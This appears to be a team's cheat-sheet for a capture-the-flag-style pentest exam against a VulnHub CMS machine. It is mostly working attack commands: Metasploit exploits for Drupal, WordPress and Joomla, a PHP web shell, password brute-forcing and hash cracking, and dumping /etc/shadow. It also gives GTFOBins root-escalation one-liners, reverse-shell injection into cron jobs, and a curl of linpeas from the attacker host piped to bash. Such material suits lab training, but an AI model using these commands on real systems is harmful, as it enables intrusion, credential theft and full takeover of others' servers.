# MA1 — CMS Pentest Cheat-Sheet (Day 1)

> 🚨 **Day 1 target is a randomly-picked VulnHub VM** (chief Marlon's confirmation). The CMS could be Drupal, WordPress, Joomla, MediaWiki, or something else. Your Drupal 7 practice covers ONE case — this cheat-sheet covers the others so you can adapt in 5 minutes at the venue.

> 🧠 **MEMORIZE WITH TEAMMATE — the methodology, not every command.** You won't remember every flag, but you should know: "If it's WordPress, I run wpscan." "If it's Joomla, I run joomscan." Drill the table at the end of this file.

---

## The universal MA1 methodology (works for ANY CMS)

```
1. Recon                → nmap discovers ports + services
2. Identify CMS         → whatweb tells you what's running
3. Find vulnerabilities → searchsploit + CMS-specific scanner
4. Exploit              → run the matching Metasploit module OR manual exploit
5. Dump users           → from CMS database OR /etc/passwd
6. Crack password       → hashcat with the right -m mode
7. SSH in as user       → use cracked credentials
8. Read user secret     → cat ~/secret.txt or similar
9. Privilege escalate   → sudo -l, SUID binaries, kernel exploits
10. Read root flag      → cat /root/proof.txt or similar
11. Write report        → exec summary + top-3 risks
```

**Steps 1, 5–11 are identical for every CMS.** Only steps 2–4 change based on which CMS.

---

## Step 1 — Recon (universal)

```bash
export TGT=192.168.2.1
mkdir -p ~/ma1 && cd ~/ma1

# Scan
nmap -sC -sV -T4 -oN nmap_quick.txt $TGT

# Optional: full port range (slower)
nmap -p- --min-rate 5000 -oN nmap_full.txt $TGT
```

📸 Screenshot the nmap output for Task 1 Q1 (services).

**Find the secret message (Task 1 Q2)** — try every service:
```bash
# HTTP source code (HTML comments often hide flags)
curl -s http://$TGT/ -o home.html
grep -iE "secret|flag|hidden|<!--" home.html

# Common hidden files
curl http://$TGT/robots.txt
curl http://$TGT/sitemap.xml
curl http://$TGT/.htaccess
curl http://$TGT/CHANGELOG.txt
curl http://$TGT/README.txt

# SSH banner
nc -nv $TGT 22
# Press Ctrl+C after 5 sec

# Directory enum
gobuster dir -u http://$TGT -w /usr/share/wordlists/dirb/common.txt -x txt,html,php
```

---

## Step 2 — Identify the CMS (universal first move)

```bash
whatweb http://$TGT
```

Read the output. The CMS name + version appears like:
- `Drupal[7.57]` → use Drupal section below
- `WordPress[5.7]` → use WordPress section
- `Joomla!` → use Joomla section
- `MediaWiki[1.30]` → use MediaWiki section

**Backup:** check page source for `<meta name="generator" content="...">` — almost always reveals the CMS.

---

## Step 3+4 — Per-CMS attack recipes

### 🟪 Drupal (your practice target)

```bash
# Identify version
whatweb http://$TGT
curl -s http://$TGT/CHANGELOG.txt | head -5

# Drupal-specific scanner
droopescan scan drupal -u http://$TGT

# Find exploits
searchsploit drupal 7

# Most common: Drupalgeddon2 (CVE-2018-7600)
msfconsole -q
> use exploit/unix/webapp/drupal_drupalgeddon2
> set RHOSTS 192.168.2.1
> set LHOST 192.168.2.2
> set TARGETURI /
> run
# → Meterpreter as www-data

# Inside meterpreter:
> shell
> cat /var/www/html/sites/default/settings.php | grep -A3 databases
> mysql -u drupal -pdrupalpass drupal -e "SELECT uid,name,pass FROM users;"
```

**Hashcat mode for Drupal 7:** `-m 7900` (hash starts with `$S$`)

---

### 🟦 WordPress

```bash
# Identify
whatweb http://$TGT

# WP-specific scanner
wpscan --url http://$TGT --enumerate u,p,t,vp,vt
# u = users, p = plugins, t = themes
# vp = vulnerable plugins, vt = vulnerable themes

# Brute-force admin login (if usernames found)
wpscan --url http://$TGT -U admin -P /usr/share/wordlists/rockyou.txt

# Find exploits
searchsploit wordpress
searchsploit wordpress <plugin_name>

# Common attack: vulnerable plugin RCE
msfconsole -q
> search type:exploit name:wordpress
> use exploit/unix/webapp/wp_<plugin>_rce
> set RHOSTS 192.168.2.1
> set LHOST 192.168.2.2
> run

# OR: weak admin pwd → upload reverse shell via theme/plugin editor
# Once admin: Appearance → Editor → 404.php → paste PHP reverse shell:
#   <?php system($_GET['c']); ?>
# Trigger: curl "http://$TGT/wp-content/themes/<theme>/404.php?c=id"

# Dump users from wp_users table:
mysql -u wp -p<pass> wordpress -e "SELECT user_login,user_pass FROM wp_users;"
```

**Hashcat mode for WordPress:** `-m 400` (hash starts with `$P$` or `$H$` — phpass)

---

### 🟧 Joomla

```bash
# Identify
whatweb http://$TGT

# Joomla-specific scanner
joomscan -u http://$TGT

# Find exploits
searchsploit joomla

# Common attacks:
#   - com_users SQLi (CVE-2017-8917)
#   - com_jce upload bypass
#   - account creation via Article Manager
#   - admin pwd brute force

msfconsole -q
> search type:exploit name:joomla
> use exploit/unix/webapp/joomla_<module>
> set RHOSTS 192.168.2.1
> run

# Configuration file with DB creds (often readable):
curl http://$TGT/configuration.php-dist
# OR after RCE:
cat /var/www/html/configuration.php | grep -E "user|password|db"

# Dump users:
mysql -u joomla -p<pass> joomla -e "SELECT username,password FROM #__users;"
```

**Hashcat mode for Joomla:** `-m 11` (older) or `-m 400` (phpass) — Joomla 3.x+

---

### 🟩 MediaWiki

```bash
# Identify
whatweb http://$TGT
curl http://$TGT/api.php?action=query&meta=siteinfo

# Find exploits
searchsploit mediawiki

# Common attack: Scribunto unsafe code execution (CVE-2017-8809), or 
# weak admin → edit MediaWiki:Common.js for stored XSS / RCE
```

**Hashcat mode for MediaWiki:** `-m 3711` (newer) or `-m 11200` (depending on version)

---

### 🟨 Other / unknown CMS

If `whatweb` doesn't recognise it:
```bash
# Generic web vuln scanner
nikto -h http://$TGT

# Directory brute
gobuster dir -u http://$TGT -w /usr/share/wordlists/dirb/big.txt

# Look for admin pages, install pages, backup files
curl http://$TGT/admin/
curl http://$TGT/install/
curl http://$TGT/.git/HEAD       # exposed .git directory
curl http://$TGT/backup.sql

# Try common default creds
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $TGT http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

If you find any custom PHP / Python web app: read its source if accessible (`.git`, `/.env`, backup files).

---

## Step 5–6 — Dump users + crack passwords (universal once you have shell)

After you have www-data shell on the box:

```bash
# Linux user enumeration (always do this)
cat /etc/passwd | grep -v "/usr/sbin/nologin" | grep -v "/bin/false"
# Pick the human users (UID >= 1000 typically)

# CMS-specific user dump (varies — see above per-CMS sections)

# Linux password hashes (usually need root, but sometimes readable!)
cat /etc/shadow 2>/dev/null
# If readable: copy hashes, crack with hashcat -m 1800 (sha512crypt)
```

**Hashcat reference (most common modes):**

| Hash format | Mode | Used by |
|---|---|---|
| `$S$D...` | **7900** | Drupal 7 |
| `$P$B...` or `$H$...` | **400** | WordPress, phpBB3, Joomla 3+ |
| `$1$...` | 500 | Linux MD5-crypt |
| `$5$...` | 7400 | Linux SHA-256-crypt |
| `$6$...` | **1800** | Linux SHA-512-crypt (`/etc/shadow`) |
| `aad3b435...` | 1000 | Windows NTLM |
| Plain MD5 (32 chars hex) | 0 | Generic |
| Plain SHA-1 (40 chars hex) | 100 | Generic |

```bash
# General template
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt

# If wordlist is gzipped:
gunzip -k /usr/share/wordlists/rockyou.txt.gz

# Show cracked password if hash already cracked once
hashcat -m <mode> hash.txt --show
```

---

## Step 7-8 — SSH in as cracked user

```bash
ssh <cracked_user>@$TGT
# password: <cracked password>

# If port isn't 22:
ssh -p 2222 <user>@$TGT

# Once in:
cat ~/secret.txt           # MA1 Task 3 Q3 typical answer
cat ~/.bash_history
ls -la ~/.ssh/             # any keys?
find / -user <yourself> 2>/dev/null
```

---

## Step 9 — Privilege escalation (always try ALL of these)

```bash
# 1. Sudo gold (most common)
sudo -l
# Look for: NOPASSWD anywhere → check GTFOBins for that binary
# Common GTFOBins privesc:
#   sudo /usr/bin/vim -c ':!/bin/bash'
#   sudo /usr/bin/find . -exec /bin/sh \;
#   sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
#   sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
#   sudo /usr/bin/less /etc/profile  → then type "!sh"
#   sudo /usr/bin/nano /tmp/x  → then Ctrl+R, Ctrl+X, type "reset; sh 1>&0 2>&0"

# 2. SUID binaries (next most common)
find / -perm -4000 -type f 2>/dev/null
# Look for: vim, find, awk, python, perl, less, more, nmap, base64, cp, mv
# Same GTFOBins lookups apply but use `./binary` not `sudo binary`
# Example: SUID find:
#   find . -exec /bin/sh -p \; -quit

# 3. Writable cron jobs
cat /etc/crontab
ls -la /etc/cron.*
# If any cron script is writable by your user → inject a reverse shell

# 4. Kernel exploits (last resort — can crash the box)
uname -a              # kernel version
searchsploit linux kernel <version>
# Famous ones: dirty pipe (5.8-5.16.11), dirty cow (older)

# 5. Quick wins
cat /etc/passwd | cut -d: -f1     # any users you missed?
ls -la /                          # any unusual world-writable dirs?
ls -la /opt /var/backups          # forgotten backups with creds
```

**Run `linpeas.sh` automatically** if available:
```bash
# On Kali, serve it:
cd /usr/share/linpeas
python3 -m http.server 8000

# On target:
curl http://192.168.2.2:8000/linpeas.sh | bash
```

---

## Step 10–11 — Capture root flag + report

```bash
# As root:
cat /root/proof.txt           # OR root.txt, flag.txt — typical names
cat /etc/shadow | head -5     # proof of root
ls -la /root/
```

📸 Screenshot `whoami` (showing `root`) + `cat /root/proof.txt` for Task 3 Q4.

**Report (Task 4)** template — same as Drupal version, swap names:
- Risk 1: <CMS> <version> vulnerable to <CVE> (RCE/SQLi/etc.)
- Risk 2: Weak user password (<user> = <pass>) crackable in <time>
- Risk 3: Privilege escalation via <method>

Save as: `PHL_Team1_MA1_Report.pdf` on Desktop.

---

## 🧠 Quick-recall drill table — quiz your teammate

| Question | Answer |
|---|---|
| First command after VPN/network up? | `nmap -sC -sV -T4 -oN nmap.txt 192.168.2.1` |
| Tool to identify the CMS? | `whatweb http://192.168.2.1` |
| Drupal scanner? | `droopescan scan drupal -u <url>` |
| WordPress scanner? | `wpscan --url <url> --enumerate u,p,t` |
| Joomla scanner? | `joomscan -u <url>` |
| Hashcat mode for Drupal 7? | `7900` |
| Hashcat mode for WordPress? | `400` |
| Hashcat mode for Linux `/etc/shadow`? | `1800` |
| First privesc check? | `sudo -l` |
| SUID file finder? | `find / -perm -4000 -type f 2>/dev/null` |
| GTFOBins vim privesc? | `sudo /usr/bin/vim -c ':!/bin/bash'` |
| Where to save the report? | Desktop, `PHL_Team1_MA1_Report.pdf` |

---

## What to bring on USB for Day 1

- [ ] **GTFOBins offline mirror** (clone `https://github.com/GTFOBins/GTFOBins.github.io`) — privesc lookups for any binary
- [ ] **HackTricks PDF** — methodology reference
- [ ] **linpeas.sh, linenum.sh, linux-exploit-suggester.sh** — automated privesc
- [ ] **rockyou.txt** (extracted)
- [ ] **SecLists** — `git clone https://github.com/danielmiessler/SecLists`
- [ ] **searchsploit DB updated** — run `searchsploit -u` before going offline
- [ ] **CMS scanners** verified working: `wpscan`, `droopescan`, `joomscan`, `cmsmap`, `nikto`

---

## ⏱️ Time budget per CMS

If CMS is Drupal — 90 min total (you've practised this).
If CMS is anything else — **120 min total** (extra 30 min for tool-switching).

Buffer the report-writing slot to 1.5 h instead of 1 h if uncertain.

---

> **Bottom line:** Drupal practice was for fluency in the *workflow*. Whatever CMS shows up tomorrow, the workflow is the same. Step 2 identifies it, the per-CMS section above gives you the right tools, and steps 5-11 are the same forever.
